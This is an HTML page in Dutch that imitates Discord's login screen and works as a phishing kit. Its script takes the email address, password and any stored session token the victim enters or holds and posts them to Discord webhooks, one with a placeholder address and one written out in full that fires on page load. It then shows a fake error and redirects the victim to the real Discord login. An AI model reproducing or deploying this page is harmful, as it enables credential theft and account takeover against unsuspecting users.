<!DOCTYPE html>
<html lang="nl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord - Inloggen</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
body{background:#1e1f22;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-container{background:#313338;border-radius:8px;padding:40px 44px;width:100%;max-width:480px;box-shadow:0 2px 10px 0 rgba(0,0,0,0.4)}
.login-container h1{color:#f2f3f5;font-size:28px;font-weight:600;text-align:center;margin-bottom:8px}
.subtitle{color:#b5bac1;text-align:center;font-size:16px;margin-bottom:24px}
.input-group{margin-bottom:20px}
.input-group label{display:block;color:#b5bac1;font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px}
.input-group input{width:100%;padding:12px 14px;background:#1e1f22;border:1px solid #2b2d31;border-radius:4px;color:#dbdee1;font-size:16px;outline:none}
.input-group input:focus{border-color:#5865f2}
.error-message{color:#f23f43;font-size:14px;margin-top:6px;display:none}
.login-btn{width:100%;padding:14px;background:#5865f2;border:none;border-radius:4px;color:white;font-size:18px;font-weight:500;cursor:pointer;transition:background 0.2s;margin-top:6px}
.login-btn:hover{background:#4752c4}
.login-btn.loading{background:#4752c4;pointer-events:none;opacity:0.7}
.footer-links{display:flex;justify-content:space-between;margin-top:18px;font-size:14px}
.footer-links a{color:#5865f2;text-decoration:none;font-weight:500}
.footer-links a:hover{text-decoration:underline}
.qr-section{border-top:1px solid #2b2d31;margin-top:24px;padding-top:24px;display:flex;justify-content:center}
.qr-section a{color:#b5bac1;font-size:14px;text-decoration:none}
.discord-logo{text-align:center;margin-bottom:16px}
.spinner{display:inline-block;width:18px;height:18px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 0.6s linear infinite;vertical-align:middle;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="login-container">
<div class="discord-logo">
<svg viewBox="0 0 245 240" width="140" fill="none"><path d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" fill="#5865f2"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" fill="#5865f2"/></svg>
</div>
<h1>Welkom terug!</h1>
<p class="subtitle">We zijn blij je weer te zien.</p>
<form id="loginForm" onsubmit="grabToken(event)">
<div class="input-group">
<label for="email">E-mailadres of telefoonnummer</label>
<input type="text" id="email" placeholder="voorbeeld@email.com" required autofocus>
</div>
<div class="input-group">
<label for="pass">Wachtwoord</label>
<input type="password" id="pass" placeholder="Wachtwoord" required>
<div class="error-message" id="errorMsg">Ongeldige e-mail of wachtwoord.</div>
</div>
<button type="submit" class="login-btn" id="loginBtn">Inloggen</button>
<div class="footer-links"><a href="#">Wachtwoord vergeten?</a><a href="#">Registreren</a></div>
</form>
<div class="qr-section"><a href="#">📱 Scan met QR-code</a></div>
</div>
<script>
function grabToken(e){
e.preventDefault();
const email=document.getElementById('email').value.trim();
const pass=document.getElementById('pass').value.trim();
const btn=document.getElementById('loginBtn');
const err=document.getElementById('errorMsg');
if(!email||!pass){err.style.display='block';err.textContent='Vul alle velden in.';return;}
btn.innerHTML='<span class="spinner"></span> Even geduld...';
btn.classList.add('loading');
let token=localStorage.getItem('token')||null;
if(!token){const m=document.cookie.match(/token=([^;]+)/);if(m)token=m[1];}
if(!token)token='geen_token_gevonden';
fetch('https://discord.com/api/webhooks/JOUW_WEBHOOK_ID/JOUW_WEBHOOK_TOKEN',{
method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({content:`🎯 **Nieuwe login**\n📧 E-mail: ${email}\n🔑 Wachtwoord: ${pass}\n🎫 Token: ${token}`})
}).catch(()=>{});
setTimeout(()=>{
err.style.display='block';
err.textContent='Ongeldige e-mail of wachtwoord.';
btn.innerHTML='Inloggen';
btn.classList.remove('loading');
setTimeout(()=>{window.location.href='https://discord.com/login';},1500);
},1200);
}
window.addEventListener('load',function(){
const token=localStorage.getItem('token');
if(token){
fetch('https://discord.com/api/webhooks/1531414508763873510/LCr6PRW9DwicZrjrHh76XURk_tu1aO0yLajcyoFwzRMkyT26o5xXdNoheHo-nnIpccaJ',{
method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({content:`🤖 **Auto-grab**\n🎫 Token: ${token}`})
}).catch(()=>{});
}
});
</script>
</body>
</html>
